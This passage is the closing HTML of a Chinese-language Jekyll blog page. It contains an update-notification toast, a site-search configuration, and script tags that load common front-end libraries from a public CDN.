class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">发现新版本的内容。</p><button type="button" class="btn btn-primary" aria-label="Update"> 更新 </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">搜索结果为空</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/zh.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
